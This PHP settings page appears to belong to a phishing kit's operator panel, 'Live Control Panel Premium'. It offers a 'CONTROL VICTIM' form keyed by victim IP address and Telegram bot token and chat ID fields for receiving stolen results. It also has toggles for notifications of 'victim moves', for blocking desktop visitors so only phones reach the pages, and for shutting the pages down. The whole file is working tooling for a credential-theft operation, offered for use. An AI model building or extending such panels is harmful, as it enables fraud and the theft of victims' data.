<?php 
session_start();
require "classes/admin.class.php";
 
$admin = new Admin;
$admin->setDataFile("data/admin.json");
$settings = $admin->getData()['settings'];
$bot_token = $settings['telegram_bot'];
$id = $settings['telegram_id'];
$pc_block = $settings['pc_block'];
$shutdown = $settings['shutdown'];
$notifs =	 $settings['notifications'];


?>
<!doctype html>
<html>
<head>
<title>Settings</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
<link rel="stylesheet" href="res/app.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css"/>
<script src="res/jq.js"></script>
</head>
<body>
<div class="header">
<div class="left">
<i class='fa fa-user'></i> Welcome, Admin </b>
</div>
<div class="right">
<button onclick="window.location='settings.php';"><i class='fa fa-home'></i>Settings </button>
</div>
</div>
<div class="content">
<div class="holder">

<div class="multi">
<div class="box">
<div class="title">CONTROL VICTIM</div>
<div class="content">
	<p>Please find the IP address in your received results.</p>
	<form action="view.php" method="get">
<div class="input">
<input type="text" name="vip" id="bot-token" required placeholder="Victim IP address">
</div>
<button type="submit">GO</button>
</form>
</div>
</div>


<form action="update.php" method="post">

 
<?php
if(isset($_GET['update']) and $_GET['update']=='success'){
echo "<h3 style='color:green;'>Data updated successfully!</h3>";
}
?>


<div class="box">
<div class="title">TELEGRAM BOT</div>
<div class="content">
<div class="input">
<input type="text" name="bot_token" id="bot-token" required placeholder="Telegram Bot Token" 
value="<?php echo $bot_token; ?>">
<input type="hidden" name="update" value="1">
</div>
<div class="input">
<input type="text" name="chat_id" id="bot-token" required placeholder="Chat Ids. example:  837639720, -38729386, 662529192...." 
value="<?php echo $id; ?>">
</div>
</div>
</div>
<div class="box">
<div class="title">Pc Devices Block</div>
<div class="content">
<div class="input">
<p>Block pc devices? if you selected Yes then only mobiles will access to the pages.</p>
<label><input type="radio" name="block_pc" required  value="1" 
<?php if($pc_block==1){echo "checked";} ?> > Yes</label>
<label><input type="radio" name="block_pc" required value="0" <?php if($pc_block==0){echo "checked";} ?>> No</label>
</div>
</div>
</div>


<div class="box">
<div class="title">Telegram Notifications</div>
<div class="content">
<div class="input">
<p>You want to receive notifications of victim moves across the pages?</p>
<label><input type="radio" name="notifications" required  value="1" <?php if($notifs==1){echo "checked";} ?>> Yes</label>
<label><input type="radio" name="notifications" required  value="0" <?php if($notifs==0){echo "checked";} ?>> No</label>
</div>
</div>
</div> 


<div class="box">
<div class="title">Shut down</div>
<div class="content">
<div class="input">
<p>If you selected Yes then all pages won't be accessible until you select No again.</p>
<label><input type="radio" name="shutdown"  required value="1" <?php if($shutdown==1){echo "checked";} ?>> Yes</label>
<label><input type="radio" name="shutdown" required  value="0" <?php if($shutdown==0){echo "checked";} ?>> No</label>
</div>
</div>
</div>
<button style="margin:10px;">Save Changes </button>
</form>

</div>


</div>

 </div>

<div class="footer">
<div class="info">Live Control Panel Premium</div>
</div>
<script>
 
 

function showError(msg){
	$(".loader").hide();
	$(".loader-error").hide();
	$("#error-msg").html(msg);
	 $("#errorbox").show().delay(2000).fadeOut();
}
function showSuccess(msg){
	$(".loader").hide();
	$(".loader-error").hide();
	$("#success-msg").html(msg);
	 $("#successbox").show().delay(2000).fadeOut();
}
 


function logout(){
	window.location="index.php?logout";
}

</script>
</body>
</html>